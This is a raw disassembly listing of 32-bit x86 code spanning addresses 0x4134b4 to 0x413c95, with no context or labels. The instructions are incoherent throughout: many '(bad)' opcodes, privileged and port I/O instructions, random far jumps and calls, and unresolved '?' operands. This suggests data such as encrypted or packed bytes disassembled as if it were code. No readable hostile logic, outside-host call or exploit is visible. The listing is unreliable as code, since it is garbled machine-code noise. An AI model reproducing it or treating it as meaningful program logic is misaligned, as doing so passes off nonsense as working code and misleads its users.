  4134b4:	sbb    edx,DWORD PTR [ecx-0x61]
  4134b7:	out    dx,eax
  4134b8:	sar    BYTE PTR [ebp+0x1],0x92
  4134bc:	sub    BYTE PTR [edx],0x4f
  4134bf:	imul   eax,esp,0x7b
  4134c2:	leave  
  4134c3:	mov    esi,0x7bda7cad
  4134c8:	js     0x413530
  4134ca:	jp     0x4134e6
  4134cc:	mov    eax,ds:0x84082344
  4134d1:	xchg   esp,eax
  4134d2:	mov    dl,cl
  4134d4:	cmp    dh,dh
  4134d6:	pusha  
  4134d7:	fild   DWORD PTR [edx]
  4134d9:	pushf  
  4134da:	mov    dh,0x6b
  4134dc:	fstp   DWORD PTR [ebp-0x166a406a]
  4134e2:	(bad)  
  4134e3:	loop   0x4134f6
  4134e5:	(bad)  
  4134e6:	mov    esi,0x485d2e7b
  4134eb:	dec    DWORD PTR [ebx]
  4134ed:	pop    es
  4134ee:	iret   
  4134ef:	cs jle 0x41356b
  4134f2:	daa    
  4134f3:	(bad)  
  4134f4:	pushf  
  4134f5:	sub    DWORD PTR [edi-0x4d9aedad],0xffffff8c
  4134fc:	sub    BYTE PTR ds:0x11b02fb9,cl
  413502:	inc    esp
  413503:	test   eax,0x75a34c96
  413508:	std    
  413509:	lods   eax,DWORD PTR ds:[esi]
  41350a:	xor    cl,ch
  41350c:	push   edx
  41350d:	mov    ebx,0x5349c9dd
  413512:	add    DWORD PTR [ebx+0x185dbcd7],esp
  413518:	fst    QWORD PTR [edx]
  41351a:	mov    esp,0xd837aeb3
  41351f:	jb     0x4134b0
  413521:	inc    ebx
  413522:	mov    fs,ebp
  413524:	inc    esp
  413525:	inc    BYTE PTR [si-0xf6c]
  41352a:	rcl    edi,1
  41352c:	xchg   edi,eax
  41352d:	fidiv  DWORD PTR [ebx-0x7e478238]
  413533:	(bad)  
  413534:	js     0x41352c
  413536:	aaa    
  413537:	push   0xd172bd35
  41353c:	mov    al,al
  41353e:	aam    0x8a
  413540:	or     eax,0x12467448
  413545:	xor    BYTE PTR [edx],0xf3
  413548:	adc    bh,BYTE PTR [esi]
  41354a:	icebp  
  41354b:	out    dx,eax
  41354c:	xor    eax,0xe5f9372d
  413551:	push   edx
  413552:	fidivr DWORD PTR [ebx]
  413554:	adc    eax,0x3f7ef45d
  413559:	call   0x2412a377
  41355e:	ds mov edx,0x6a4b4bb1
  413564:	xchg   esi,eax
  413565:	in     al,0xdb
  413567:	leave  
  413568:	jp     0x413547
  41356a:	inc    edx
  41356b:	mov    dh,0x44
  41356d:	rcr    ecx,cl
  41356f:	mov    es,WORD PTR gs:[edx-0x1e]
  413573:	icebp  
  413574:	sub    ecx,esp
  413576:	in     eax,0xac
  413578:	xor    DWORD PTR [eax+ecx*1-0x5f],0x4ebd9f4a
  413580:	push   ebx
  413581:	add    BYTE PTR [ecx+0x685a0957],ch
  413587:	cmp    eax,0x843f566d
  41358c:	aam    0x8c
  41358e:	adc    ebx,DWORD PTR [ecx-0x4]
  413591:	mov    ebx,0xd1acfc3f
  413596:	mov    ds:0xe53dadc5,eax
  41359b:	dec    edx
  41359c:	jb     0x413586
  41359e:	nop
  41359f:	test   al,0x5d
  4135a1:	pushf  
  4135a2:	add    eax,0x8008fef
  4135a7:	nop
  4135a8:	hlt    
  4135a9:	push   0xffffff9e
  4135ab:	dec    ecx
  4135ac:	sahf   
  4135ad:	inc    ebp
  4135ae:	pop    esp
  4135af:	mov    ebx,0x15e8169e
  4135b4:	not    al
  4135b6:	iret   
  4135b7:	jnp    0x4135ca
  4135b9:	mov    ds:0x181ab886,al
  4135be:	jge    0x41356c
  4135c0:	xor    bh,BYTE PTR [ebp+0x86d27]
  4135c6:	mov    ecx,0x52352532
  4135cb:	sahf   
  4135cc:	cwde   
  4135cd:	sub    BYTE PTR [edx],bh
  4135cf:	ins    BYTE PTR es:[edi],dx
  4135d0:	add    DWORD PTR [ebp+0x5c],0x5f692b28
  4135d7:	out    dx,eax
  4135d8:	jmp    0x413587
  4135da:	mov    BYTE PTR [eax],bh
  4135dc:	push   ecx
  4135dd:	or     dl,BYTE PTR [ecx+0x4c]
  4135e0:	(bad)  
  4135e2:	dec    esi
  4135e3:	retf   0xba86
  4135e6:	pop    ds
  4135e7:	or     BYTE PTR [eax+0x1e28ce40],0xdc
  4135ee:	iret   
  4135ef:	aaa    
  4135f0:	leave  
  4135f1:	cmp    al,0x26
  4135f3:	rcl    BYTE PTR [ebp-0x7],0xde
  4135f7:	pop    es
  4135f8:	ins    BYTE PTR es:[edi],dx
  4135f9:	lahf   
  4135fa:	and    BYTE PTR [eax+0x4],0x78
  4135fe:	in     al,0x57
  413600:	mov    eax,ds:0xb9f2aeeb
  413605:	inc    ebp
  413606:	jg     0x413653
  413608:	jno    0x41365d
  41360a:	push   esi
  41360b:	ss fs fs mov dh,0x25
  413610:	pusha  
  413611:	mov    ah,0xfb
  413613:	lds    eax,FWORD PTR [esi+ecx*2-0x12]
  413617:	gs pop esi
  413619:	outs   dx,BYTE PTR cs:[esi]
  41361b:	dec    ecx
  41361c:	xor    ch,BYTE PTR ds:[ebx]
  41361f:	out    0x48,eax
  413621:	push   esp
  413622:	xor    BYTE PTR [edi+0x46c2448a],ch
  413628:	(bad)  
  413629:	push   edi
  41362a:	leave  
  41362b:	push   0x2069404f
  413630:	cmp    al,0xb0
  413632:	push   edi
  413633:	rol    ch,1
  413635:	lods   al,BYTE PTR ds:[esi]
  413636:	push   esi
  413637:	repnz mul DWORD PTR ds:0x1cf57dd3
  41363e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41363f:	adc    BYTE PTR [edx-0x73],cl
  413642:	xor    eax,0x367d614a
  413647:	sub    edx,DWORD PTR [ebx+0x36]
  41364a:	adc    BYTE PTR [ebp-0xe],ch
  41364d:	adc    BYTE PTR [edi-0x63],0xdd
  413651:	ret    0x2e22
  413654:	popa   
  413655:	xchg   ax,ax
  413658:	adc    eax,0x1da749b7
  41365d:	or     ah,BYTE PTR [esi+0x4806a01a]
  413663:	push   ebx
  413664:	loopne 0x413655
  413666:	push   ds
  413667:	jne    0x41362f
  413669:	jmp    0xebc3a7a1
  41366e:	invd   
  413670:	mov    dh,0x42
  413672:	mov    edi,0x2f89b69d
  413677:	loopne 0x413690
  413679:	add    ebp,esp
  41367b:	stos   DWORD PTR es:[edi],eax
  41367c:	in     eax,0xc7
  41367e:	mov    esi,0x4d3ecac4
  413683:	inc    ebp
  413684:	nop
  413685:	jnp    0x4136f9
  413687:	inc    eax
  413688:	das    
  413689:	rcr    ebx,cl
  41368b:	xchg   edx,eax
  41368c:	(bad)
  41368f:	in     eax,dx
  413690:	in     al,dx
  413691:	dec    eax
  413692:	jg     0x41361e
  413694:	mov    ds:0xe3daec87,al
  413699:	mov    eax,0xec752d04
  41369e:	and    bl,BYTE PTR [ecx+0x1b]
  4136a1:	jmp    0xffcb:0x8f771908
  4136a8:	sbb    al,0x60
  4136aa:	xchg   ebp,eax
  4136ab:	or     BYTE PTR [eax-0x53],al
  4136ae:	xchg   ebp,eax
  4136af:	mov    bh,0xd8
  4136b1:	nop
  4136b2:	aaa    
  4136b3:	xchg   edi,eax
  4136b4:	pop    ebx
  4136b5:	popf   
  4136b6:	push   esi
  4136b7:	mov    al,ds:0x21145ef6
  4136bc:	add    eax,0x3928ba9e
  4136c1:	call   0xea698857
  4136c6:	mov    ecx,0x6f94717
  4136cb:	(bad)
  4136cf:	(bad)  
  4136d0:	xor    eax,0xf30340e2
  4136d5:	jb     0x4136f3
  4136d7:	cmp    bh,ah
  4136d9:	loope  0x413697
  4136db:	or     DWORD PTR [eax+0x66],ebp
  4136de:	and    DWORD PTR [edi],0xffffff8c
  4136e1:	xor    ecx,DWORD PTR [edx-0x6899a69d]
  4136e7:	jl     0x41370b
  4136e9:	inc    ecx
  4136ea:	mov    bl,0x5e
  4136ec:	jo     0x41371e
  4136ee:	ja     0x4136b7
  4136f0:	rol    BYTE PTR [eax+esi*2],cl
  4136f3:	push   0x6e
  4136f5:	mov    bl,0xb1
  4136f7:	int3   
  4136f8:	imul   esi,eax,0x44
  4136fb:	mov    al,ds:0xba80f5a0
  413700:	aaa    
  413701:	hlt    
  413702:	clc    
  413703:	jno    0x4136a6
  413705:	push   esp
  413706:	retf   0xdcdd
  413709:	sbb    cl,dh
  41370b:	retf   0x3bc9
  41370e:	jl     0x41375d
  413710:	push   eax
  413711:	out    0xf7,al
  413713:	rcr    dh,0xf
  413716:	mov    dh,0x50
  413718:	popf   
  413719:	inc    ebp
  41371a:	dec    esp
  41371b:	xor    BYTE PTR [edi+0x2f33f0e7],0x4
  413722:	pop    ds
  413723:	stos   BYTE PTR es:[edi],al
  413724:	repz cld 
  413726:	mov    ebx,0x6f4607d
  41372b:	cmp    ah,BYTE PTR [di]
  41372e:	push   esp
  41372f:	dec    ecx
  413730:	fcom   DWORD PTR [edi]
  413732:	ss loope 0x41370b
  413735:	outs   dx,DWORD PTR ds:[esi]
  413736:	pop    edx
  413737:	out    dx,eax
  413738:	pop    esi
  413739:	sub    eax,0x34dcfed4
  41373e:	cmp    DWORD PTR [eax],edi
  413740:	dec    eax
  413741:	in     al,0x26
  413743:	retf   
  413744:	jns    0x4137c5
  413746:	aam    0xfb
  413748:	dec    edi
  413749:	int    0x22
  41374b:	bound  ebx,QWORD PTR [ecx]
  41374d:	mov    esp,0xa14c844c
  413752:	(bad)  
  413753:	fcom   DWORD PTR [eax+0x77]
  413756:	pop    ecx
  413757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413758:	add    DWORD PTR [edi],ebx
  41375a:	sub    DWORD PTR [ecx+eiz*1+0xf],ebx
  41375e:	ins    DWORD PTR es:[edi],dx
  41375f:	push   0x41c3dab1
  413764:	popa   
  413765:	mov    esp,0x8754d2b7
  41376a:	int3   
  41376b:	push   es
  41376c:	and    cl,BYTE PTR [esi-0x2f]
  41376f:	mov    al,ds:0xbd66396d
  413774:	push   ds
  413775:	sub    dh,BYTE PTR [edi+ebx*8-0x3045bb07]
  41377c:	mov    al,0x7a
  41377e:	int3   
  41377f:	sub    cl,BYTE PTR ds:0x49d1100e
  413785:	pop    ecx
  413786:	ins    DWORD PTR es:[edi],dx
  413787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413788:	dec    edi
  413789:	cli    
  41378a:	mov    bh,0xd0
  41378c:	out    dx,eax
  41378d:	pop    es
  41378e:	sbb    al,0xee
  413790:	test   DWORD PTR [ecx+0xc723807],ecx
  413796:	ins    BYTE PTR es:[edi],dx
  413797:	adc    DWORD PTR [eax],0xffffff97
  41379a:	fidivr DWORD PTR [esi-0x2]
  41379d:	pop    esp
  41379e:	jo     0x4137c8
  4137a0:	fwait
  4137a1:	push   esi
  4137a2:	adc    bl,BYTE PTR [eax+ecx*2+0x272638e6]
  4137a9:	dec    eax
  4137aa:	inc    edx
  4137ab:	sub    DWORD PTR [ecx],ecx
  4137ad:	dec    edx
  4137ae:	add    DWORD PTR [ecx+eax*8+0x6e],esi
  4137b2:	xor    al,0x43
  4137b4:	cmp    eax,0xa2b9e706
  4137b9:	sbb    eax,0x3f4fc898
  4137be:	push   ds
  4137bf:	rol    BYTE PTR [ebx],1
  4137c1:	rcl    BYTE PTR [edi+eax*8+0xdf05b83],1
  4137c8:	mov    esp,0xec827851
  4137cd:	das    
  4137ce:	dec    ebx
  4137cf:	int    0xf1
  4137d1:	sahf   
  4137d2:	dec    ebp
  4137d3:	out    0xb5,al
  4137d5:	mov    DWORD PTR [eax-0x2dd9559a],eax
  4137db:	push   0x74
  4137dd:	(bad)  
  4137de:	cmovae ebp,DWORD PTR [edx+0x7cc1d837]
  4137e5:	mov    bl,BYTE PTR [ecx]
  4137e7:	jb     0x4137d7
  4137e9:	dec    ebp
  4137ea:	or     dh,BYTE PTR [ebx-0x1562e060]
  4137f0:	jle    0x413837
  4137f2:	ror    BYTE PTR [edx+0x1756d1f2],1
  4137f8:	das    
  4137f9:	push   ecx
  4137fa:	(bad)  
  4137fb:	xchg   esi,eax
  4137fc:	inc    ebp
  4137fd:	xor    al,0x3b
  4137ff:	sbb    al,bh
  413801:	mov    dh,0x6d
  413803:	cdq    
  413804:	push   eax
  413805:	pop    edi
  413806:	lock mov ecx,0xa2607e1c
  41380c:	in     al,dx
  41380d:	push   eax
  41380e:	loopne 0x413822
  413810:	inc    esi
  413811:	push   eax
  413812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413813:	aaa    
  413814:	xchg   edi,eax
  413815:	sbb    al,ah
  413817:	arpl   WORD PTR [ecx-0x28ce27ed],bx
  41381d:	mov    ecx,0x4e6cd4c
  413822:	loopne 0x413821
  413824:	xchg   ecx,eax
  413825:	and    edx,DWORD PTR [eax]
  413827:	cli    
  413828:	jmp    0x2069:0xb13df080
  41382f:	add    al,0x57
  413831:	add    DWORD PTR [ecx],ecx
  413833:	push   ss
  413834:	je     0x413890
  413836:	xor    edi,DWORD PTR [ebx]
  413838:	mov    ds:0x4f097c32,al
  41383d:	popf   
  41383e:	push   esp
  41383f:	das    
  413840:	in     al,dx
  413841:	(bad)  
  413842:	test   eax,0xf3509d2c
  413847:	cld    
  413848:	jnp    0x413869
  41384a:	push   esp
  41384b:	stc    
  41384c:	xchg   ecx,eax
  41384d:	stos   BYTE PTR es:[edi],al
  41384e:	xchg   edi,eax
  41384f:	daa    
  413850:	and    ah,bh
  413852:	pop    esi
  413853:	adc    BYTE PTR [ebx+0x1070f29f],0x10
  41385a:	or     eax,0xc1ada77e
  41385f:	lds    ebp,FWORD PTR [ebp-0xe]
  413862:	xor    eax,DWORD PTR [ebx-0x48]
  413865:	stos   BYTE PTR es:[edi],al
  413866:	bnd jl 0x4137fc
  413869:	or     ebp,DWORD PTR ds:0xdf643fde
  41386f:	jg     0x413803
  413871:	inc    ecx
  413872:	pop    edi
  413873:	outs   dx,BYTE PTR ds:[esi]
  413874:	xchg   esi,eax
  413875:	or     eax,0x72cdb9fc
  41387a:	adc    al,0x36
  41387c:	and    DWORD PTR [eax-0x5f7f34b4],ecx
  413882:	mov    esi,0xae30bead
  413887:	jno    0x4138ed
  413889:	bound  esp,QWORD PTR ds:[ecx]
  41388c:	cld    
  41388d:	rol    bh,0x7b
  413890:	sub    BYTE PTR [esi-0x48b69651],cl
  413896:	in     al,0xb6
  413898:	aaa    
  413899:	dec    eax
  41389a:	inc    esi
  41389b:	jp     0x413905
  41389d:	into   
  41389e:	jae    0x4138cb
  4138a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138a1:	pop    edx
  4138a2:	inc    esi
  4138a3:	out    0xd7,al
  4138a5:	scas   al,BYTE PTR es:[edi]
  4138a6:	dec    DWORD PTR [esi+0x6]
  4138a9:	xchg   DWORD PTR [ebp-0x531198fc],ecx
  4138af:	add    eax,0x51689712
  4138b4:	ds pop esp
  4138b6:	(bad)  
  4138b7:	sbb    eax,0x79531739
  4138bc:	pop    ecx
  4138bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138be:	pop    ebx
  4138bf:	test   eax,0xe14e624e
  4138c4:	add    ebp,DWORD PTR [esp+esi*8]
  4138c7:	sar    al,0x5c
  4138ca:	arpl   WORD PTR [edx-0x2e],ax
  4138cd:	mov    ah,0xce
  4138cf:	hlt    
  4138d0:	mov    ebx,0x89cce749
  4138d5:	cmp    al,dl
  4138d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d8:	and    BYTE PTR [eax-0x787c2548],al
  4138de:	mov    bl,0xc2
  4138e0:	pop    ebp
  4138e1:	dec    esp
  4138e2:	aas    
  4138e3:	add    DWORD PTR [esi-0x41d77035],ecx
  4138e9:	adc    edx,ebp
  4138eb:	scas   eax,DWORD PTR es:[edi]
  4138ec:	mov    dl,0x27
  4138ee:	loope  0x413950
  4138f0:	aaa    
  4138f1:	push   ebx
  4138f2:	fwait
  4138f3:	cdq    
  4138f4:	(bad)  
  4138f5:	cmc    
  4138f6:	push   es
  4138f7:	sar    DWORD PTR [esi+0x784df953],cl
  4138fd:	fdiv   QWORD PTR [ebp-0x686f6c22]
  413903:	scas   al,BYTE PTR es:[edi]
  413904:	fiadd  WORD PTR [ebx]
  413906:	test   al,0x65
  413908:	je     0x413977
  41390a:	out    dx,al
  41390b:	adc    BYTE PTR [ecx],bh
  41390d:	or     DWORD PTR [esi+0x36],ebx
  413910:	push   esp
  413911:	jne    0x4138d7
  413913:	jns    0x413968
  413915:	popa   
  413916:	ret    0x3beb
  413919:	add    DWORD PTR [edi+edi*4],esi
  41391c:	inc    esp
  41391d:	mov    BYTE PTR [eax-0x7b65c6ac],al
  413923:	pop    edx
  413924:	adc    BYTE PTR [ecx-0x21],ch
  413927:	sbb    eax,0xdb1f7348
  41392c:	push   ebx
  41392d:	jbe    0x413965
  41392f:	jmp    0x41392b
  413931:	cmp    ebp,DWORD PTR [esi]
  413933:	dec    di
  413935:	mov    eax,0xe1f8b585
  41393a:	les    ebp,FWORD PTR [ecx]
  41393c:	stos   BYTE PTR es:[edi],al
  41393d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41393e:	dec    edi
  41393f:	adc    DWORD PTR ds:0x2f393c8a,esp
  413945:	imul   eax,DWORD PTR [esi-0x2fc60a5c],0xebaa277e
  41394f:	mov    edi,fs
  413951:	enter  0xea94,0x7f
  413955:	and    BYTE PTR [ecx],ah
  413957:	dec    ebp
  413958:	xor    edx,edx
  41395a:	stc    
  41395b:	pop    ss
  41395c:	mov    ds:0x5b6020f6,al
  413961:	(bad)  
  413962:	std    
  413963:	mov    al,ds:0x1114a75e
  413968:	loop   0x4139b9
  41396a:	in     al,dx
  41396b:	sar    DWORD PTR [edi],cl
  41396d:	xchg   esi,eax
  41396e:	sar    BYTE PTR [esi],0xdd
  413971:	lods   eax,DWORD PTR ds:[esi]
  413972:	out    0x4,eax
  413974:	scas   al,BYTE PTR es:[edi]
  413975:	cmp    eax,0xffbd871e
  41397a:	add    BYTE PTR [edi],bl
  41397c:	and    BYTE PTR [eax],0x2b
  41397f:	add    eax,0x7d386aa5
  413984:	sbb    DWORD PTR [eax+0x321da4a2],edx
  41398a:	and    edx,0xffffffbd
  41398d:	mov    ds:0x9f61ee48,eax
  413992:	mov    al,0xb2
  413994:	int3   
  413995:	mov    esp,0x1381b755
  41399a:	xchg   BYTE PTR [esi+0x5b],dh
  41399d:	dec    edx
  41399e:	ss push esi
  4139a0:	in     al,dx
  4139a1:	aad    0x8f
  4139a3:	enter  0xd3dd,0x64
  4139a7:	daa    
  4139a8:	adc    ebx,edx
  4139aa:	xchg   edx,eax
  4139ab:	jg     0x4139cf
  4139ad:	jl     0x413930
  4139af:	cs dec edx
  4139b1:	fild   DWORD PTR [edi+0xc163501]
  4139b7:	inc    eax
  4139b8:	mov    dl,0x36
  4139ba:	js     0x413a37
  4139bc:	push   ss
  4139bd:	dec    esp
  4139be:	in     al,dx
  4139bf:	call   0x15d0379d
  4139c4:	pop    eax
  4139c5:	in     al,dx
  4139c6:	das    
  4139c7:	(bad)  
  4139c8:	lock je 0x4139e6
  4139cb:	call   0x6605:0x8a3c8a8b
  4139d2:	pop    ss
  4139d3:	xchg   ebp,eax
  4139d4:	sbb    DWORD PTR ds:0x2a9c7965,0xfb8f6ff1
  4139de:	adc    eax,0x9fb65c3c
  4139e3:	push   esi
  4139e4:	add    al,0x43
  4139e6:	or     DWORD PTR ds:0xc171498a,eax
  4139ec:	fiadd  DWORD PTR [ecx+eiz*8-0x701bad74]
  4139f3:	call   0x7862eac4
  4139f8:	jp     0x41397a
  4139fa:	sti    
  4139fb:	or     DWORD PTR ds:0xa95827fd,ecx
  413a01:	mov    esi,0x27701a00
  413a06:	and    eax,ebp
  413a08:	and    bh,al
  413a0a:	sahf   
  413a0b:	mov    ch,0x5e
  413a0d:	out    dx,al
  413a0e:	sti    
  413a0f:	pop    eax
  413a10:	xchg   ebp,eax
  413a11:	adc    DWORD PTR [esi],ebx
  413a13:	xor    ebx,ebp
  413a15:	push   ebp
  413a16:	aas    
  413a17:	inc    ebp
  413a18:	inc    ebx
  413a19:	jb     0x413a02
  413a1b:	sbb    ebx,ecx
  413a1d:	cmp    al,0x96
  413a1f:	push   ss
  413a20:	push   esi
  413a21:	addr16 dec edi
  413a23:	or     bh,BYTE PTR ds:0x979fa338
  413a29:	jns    0x4139e9
  413a2b:	out    dx,al
  413a2c:	pop    esp
  413a2d:	dec    ebx
  413a2e:	mov    eax,edi
  413a30:	js     0x4139ca
  413a32:	sbb    ah,BYTE PTR [eax]
  413a34:	scas   al,BYTE PTR es:[edi]
  413a35:	es adc al,0x4a
  413a38:	xor    BYTE PTR [edi],dh
  413a3a:	(bad)  
  413a3c:	inc    esi
  413a3d:	mov    ch,0xb8
  413a3f:	test   DWORD PTR [ecx+edx*2+0x1e],esp
  413a43:	add    cl,BYTE PTR [ebp-0x3d]
  413a46:	call   0x6f7434a9
  413a4b:	mov    dl,ch
  413a4d:	or     cl,ch
  413a4f:	pop    esp
  413a50:	mov    al,ds:0x45d4eaa1
  413a55:	jnp    0x4139e6
  413a57:	retf   0x619d
  413a5a:	sub    DWORD PTR [ebx-0x33],ebp
  413a5d:	fisub  WORD PTR [eax+0x7d2f3879]
  413a63:	fiadd  WORD PTR [edi+0x42]
  413a66:	outs   dx,BYTE PTR ds:[esi]
  413a67:	in     eax,0xe1
  413a69:	mov    BYTE PTR [ebx+0x29],0x3
  413a6d:	in     eax,dx
  413a6e:	fisttp DWORD PTR ds:0x76e5439a
  413a74:	adc    BYTE PTR [esp+edi*8],0x90
  413a78:	fst    QWORD PTR [edi-0x2968dd1a]
  413a7e:	pop    esp
  413a7f:	mov    ebx,0xb71f3fb4
  413a84:	jmp    0xabf2:0xcb9b9a4a
  413a8b:	push   esp
  413a8c:	jecxz  0x413a60
  413a8e:	pop    edi
  413a8f:	mov    eax,ds:0xe5fdfc04
  413a94:	and    BYTE PTR [ebx+0xadceea2],dh
  413a9a:	outs   dx,BYTE PTR ds:[esi]
  413a9b:	and    BYTE PTR [ebx+0xf72f546],dl
  413aa1:	or     ch,BYTE PTR [ebp-0x50]
  413aa4:	std    
  413aa5:	mov    bh,0x98
  413aa7:	popf   
  413aa8:	arpl   WORD PTR [eax-0x4a],cx
  413aab:	out    0x2a,al
  413aad:	(bad)  
  413aaf:	cld    
  413ab0:	ror    ecx,cl
  413ab2:	sbb    esp,esi
  413ab4:	mov    edx,0x9429455d
  413ab9:	lahf   
  413aba:	dec    ebp
  413abb:	repz push DWORD PTR [ebx-0x20e9878d]
  413ac2:	dec    ebp
  413ac3:	lods   eax,DWORD PTR ds:[esi]
  413ac4:	fucomi st,st(3)
  413ac6:	ret    
  413ac7:	add    ch,BYTE PTR [edi-0x13]
  413aca:	cs gs jl 0x413ab0
  413ace:	dec    ebp
  413acf:	cmp    BYTE PTR [ecx],cl
  413ad1:	or     esp,DWORD PTR [eax+0x12fdaf4b]
  413ad7:	xchg   edx,eax
  413ad8:	pop    ebx
  413ad9:	mov    eax,0x14f8a569
  413ade:	test   eax,0xbb9a7e9a
  413ae3:	xchg   BYTE PTR [eax-0x20],ch
  413ae6:	jge    0x413b56
  413ae8:	nop
  413ae9:	inc    edi
  413aea:	shl    DWORD PTR [esi],0xdb
  413aed:	(bad)  
  413aef:	pop    eax
  413af0:	stos   BYTE PTR es:[edi],al
  413af1:	ror    DWORD PTR [edi],1
  413af3:	xor    ah,bh
  413af5:	xchg   BYTE PTR [ecx],bl
  413af7:	in     eax,dx
  413af8:	mov    esi,?
  413afa:	ret    0x325a
  413afd:	nop
  413afe:	dec    ecx
  413aff:	ror    DWORD PTR [esi],1
  413b01:	aam    0xec
  413b03:	mov    eax,0x12b18064
  413b08:	enter  0xeed,0xa9
  413b0c:	jge    0x413a91
  413b0e:	push   0xec2fa785
  413b13:	aam    0x7
  413b15:	pop    esp
  413b16:	pop    ds
  413b17:	adc    al,0xe8
  413b19:	sar    esi,0x8
  413b1c:	xchg   ebx,eax
  413b1d:	jge    0x413b84
  413b1f:	test   eax,0xbd9ecfda
  413b24:	push   ebx
  413b25:	lock push 0x25a7ded
  413b2b:	pop    edi
  413b2c:	cmp    ch,BYTE PTR [ebx-0x71]
  413b2f:	jnp    0x413aec
  413b31:	std    
  413b32:	imul   eax,DWORD PTR [edx+0x72063942],0xffffffe3
  413b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b3a:	sub    ebp,ebp
  413b3c:	call   0x26f6:0xebbac278
  413b43:	aam    0xff
  413b45:	es popa 
  413b47:	(bad)  [ecx+0x6fc4e6d]
  413b4d:	lods   eax,DWORD PTR ds:[esi]
  413b4e:	mov    dl,0xc0
  413b50:	cmp    al,0x57
  413b52:	test   al,0x49
  413b54:	jne    0x413b35
  413b56:	(bad)  
  413b57:	mov    dh,0x3
  413b59:	out    0x9d,eax
  413b5b:	scas   eax,DWORD PTR es:[edi]
  413b5c:	fstp   st(0)
  413b5e:	nop
  413b5f:	stc    
  413b60:	mov    bh,0xba
  413b62:	cmp    DWORD PTR [ebp-0x46],ebx
  413b65:	sahf   
  413b66:	mov    WORD PTR [edx+0x56f6b2bb],?
  413b6c:	movhps xmm3,QWORD PTR [edx+eiz*1]
  413b70:	sbb    bh,0x5
  413b73:	push   ecx
  413b74:	les    esi,FWORD PTR [ebx]
  413b76:	mov    eax,ds:0x2631f359
  413b7b:	rcr    dh,cl
  413b7d:	ffree  st(1)
  413b7f:	test   eax,0x85a057d
  413b84:	jne    0x413b50
  413b86:	pop    edi
  413b87:	mov    dl,0x70
  413b89:	popf   
  413b8a:	retf   
  413b8b:	mov    ecx,0x2307ce5c
  413b90:	mov    esi,0x52901b7a
  413b95:	outs   dx,DWORD PTR ds:[esi]
  413b96:	pop    ebx
  413b97:	mov    ebx,0x93e014e6
  413b9c:	je     0x413b28
  413b9e:	xor    eax,0x996c51ef
  413ba3:	inc    ebp
  413ba4:	xchg   edx,eax
  413ba5:	out    0x49,al
  413ba7:	out    0x28,al
  413ba9:	adc    eax,0x915b2c40
  413bae:	jp     0x413c27
  413bb0:	out    dx,eax
  413bb1:	adc    dh,al
  413bb3:	test   edx,ecx
  413bb5:	frstor [esi+0x3e]
  413bb8:	arpl   WORD PTR [esi+ebx*2-0xe],si
  413bbc:	fs pop ds
  413bbe:	fst    DWORD PTR [esi]
  413bc0:	sahf   
  413bc1:	es mov bh,0x94
  413bc4:	inc    esp
  413bc5:	adc    edi,DWORD PTR [esi+0x33494cc0]
  413bcb:	adc    al,0xf0
  413bcd:	mov    ds:0xb6f53753,al
  413bd2:	scas   al,BYTE PTR es:[edi]
  413bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bd4:	shr    DWORD PTR [esi+ecx*1+0x13],1
  413bd8:	ror    cl,1
  413bda:	in     al,0xdc
  413bdc:	mov    esi,0xd45f2e0c
  413be1:	mov    eax,ss
  413be3:	(bad)  
  413be4:	fstp   DWORD PTR cs:[ebx]
  413be7:	sub    cl,dl
  413be9:	cmp    ebx,DWORD PTR [ebx]
  413beb:	(bad)  
  413bed:	mov    bh,0x29
  413bef:	xchg   ebx,eax
  413bf0:	xor    eax,0x9cd33e16
  413bf5:	imul   eax,ebx,0x49
  413bf8:	push   0x1009e9d1
  413bfd:	leave  
  413bfe:	mov    dh,0x75
  413c00:	mov    esp,DWORD PTR [ebp-0x70]
  413c03:	dec    ebp
  413c04:	and    DWORD PTR [edi-0x12],edi
  413c07:	mov    ch,0xa4
  413c09:	xor    BYTE PTR [edi-0x71],0xef
  413c0d:	lods   eax,DWORD PTR ds:[esi]
  413c0e:	mov    cl,0x48
  413c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c11:	mov    ds:0x9ba0d1a9,al
  413c16:	rcr    BYTE PTR [ebx-0x39a1f137],0xc9
  413c1d:	pop    ecx
  413c1e:	jb     0x413bb3
  413c20:	ret    
  413c21:	push   es
  413c22:	frstor [edx+0x32]
  413c25:	push   ebp
  413c26:	xor    DWORD PTR [eax],0x5a0400cb
  413c2c:	aam    0x82
  413c2e:	inc    esi
  413c2f:	retf   
  413c30:	lock pop esi
  413c32:	and    al,0xc
  413c34:	push   0x9785d269
  413c39:	cmp    esp,DWORD PTR [edx]
  413c3b:	ja     0x413c59
  413c3d:	scas   eax,DWORD PTR es:[edi]
  413c3e:	mov    ?,WORD PTR [esi]
  413c40:	imul   ebx,DWORD PTR [edx+0x235f139b],0x50
  413c47:	push   DWORD PTR [edx]
  413c49:	mov    edx,0x9a484282
  413c4e:	mov    WORD PTR [edi],?
  413c50:	cwde   
  413c51:	pop    ss
  413c52:	fist   DWORD PTR [eax]
  413c54:	mov    bl,0x23
  413c56:	cmp    eax,0xf863cb1b
  413c5b:	xor    al,0x4d
  413c5d:	das    
  413c5e:	ret    0xce81
  413c61:	adc    BYTE PTR [edx],0x69
  413c64:	outs   dx,DWORD PTR ds:[esi]
  413c65:	mov    ds:0x8d1112a3,al
  413c6a:	jge    0x413ccd
  413c6c:	pushf  
  413c6d:	pop    edi
  413c6e:	out    dx,eax
  413c6f:	dec    eax
  413c70:	fild   WORD PTR [edx]
  413c72:	call   0x399d:0x34ab0d4b
  413c79:	sar    DWORD PTR [ecx-0x6f],0x7b
  413c7d:	jecxz  0x413c43
  413c7f:	push   esp
  413c80:	jb     0x413c78
  413c82:	cmp    eax,0x462ddae9
  413c87:	xor    dh,BYTE PTR [ebx+0x32]
  413c8a:	test   eax,0xd4bdc16
  413c8f:	cwde   
  413c90:	sub    BYTE PTR [edi],bl
  413c92:	or     eax,DWORD PTR [esi]
  413c94:	ins    BYTE PTR es:[edi],dx
  413c95:	fcom   QWORD PTR [ecx-0x44]
